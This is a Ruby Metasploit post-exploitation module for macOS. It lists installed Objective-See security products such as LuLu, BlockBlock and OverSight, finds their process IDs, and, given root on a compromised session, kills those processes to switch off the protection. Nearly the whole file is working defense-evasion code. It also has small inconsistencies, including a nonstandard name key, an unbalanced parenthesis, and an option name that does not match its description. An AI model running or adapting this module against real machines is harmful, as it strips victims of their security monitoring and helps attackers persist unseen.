##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::File
  include Msf::Post::OSX::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Objective See Hunter' => 'OSX Manage Module: Enumerate and disable Objective-See products',
        'Description' => %q{
          This module enumerates the system for the presence of Objective-See products such as LuLu, BlockBlock, Do Not Disturb,
          Rei Key, Ransom Where and Over Sight by checking the /Applications directory. If the KILL_PROCESS option is set to true
          the module will attempt to send a kill signal to the process id of each product, doing so requires sudo privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp' ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => 'meterpreter', # ˇTODO test on non-meterpreter sessions
        'URL' => [
          'https://objective-see.org/tools.html'
        ]
      )

  )
    register_options(
      [
        OptBool.new('KILL_PROCESSES', [
          true, 'Kills processes of installed Objective-See products. Requires root privileges.', false
        ]),
      ]
    )
  end

  # Holds information on an Objective-See product. i.e name, installation status and location on filesystem.
  class ObjectiveSee

    attr_accessor :name, :path, :pids

    cattr_accessor :installed_products

    @@installed_products = []

    # We pass in an instance of MetasploitModule in order to access Metasploit API methods via send
    # Rather than retrieving processes every time we create a new instance of ObjectiveSee we'll do it once and
    # pass that data in order to retireve the pid(s) associated w each product
    def initialize(name, msf, processes)
      @msf = msf
      @path = "/Applications/#{name}.app"
      @name = name
      @pids = []

      if installed?
        # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
        @@installed_products << self

        # get_processes returns an array pf hashes, composed of the name of the program and the pid
        # ex. [{"name"=>"configd", "pid"=>116}, {"name"=>"logd", "pid"=>104},..

        processes.each { |elem| @pids << elem['pid'] if elem['name'].include? @name.split(' ')[0] }
      end
    end

    def installed?
      @msf.send :directory?, @path
    end
  end

  # Determine which products are installed and their ppid if any
  def enumerate
    [
      'LuLu', 'BlockBlock Helper', 'Do Not Disturb',
      'ReiKey', 'RansomWhere', 'OverSight'
    ].map do |prod|
      ObjectiveSee.new prod, self, @processes
    end
  end

  def fail_no_root
    unless is_root?
      fail_with(Failure::BadConfig,
                'The current session is not root. Please escalate the session and try again before rerunning the module.')
    end
  end

  def kill_pids(obj_see)
    print_status "Attempting to kill pid(s) #{obj_see.pids.inspect} for #{obj_see.name}"
    obj_see.pids.each do |pid|
      result = kill_process pid
      print_good "Kill signal was successful for #{pid}" if result
    end
  end

  def run
    print_status('Retrieving process list...')
    @processes = get_processes

    print_status('Enumerating Objective See security products...')
    enumerate

    if ObjectiveSee.installed_products.empty?
      fail_with(Failure::NotFound,
                'No Objective Cee products were found to be installed on the system.')
    else
      print_good('The following Objective See products were found installed on the system:')
      ObjectiveSee.installed_products.each { |prod| print_status("Found #{prod.name} with pids of #{prod.pids.inspect}") }
    end

    # TODO: look into report_note post/windows/gather/enum_av uses these to log antivirus installation on the system
    # todo test killing procs
    if datastore['KILL_PROCESSES']
      fail_no_root
      ObjectiveSee.installed_products.each { |prod| kill_pids prod }
    end
  end
end
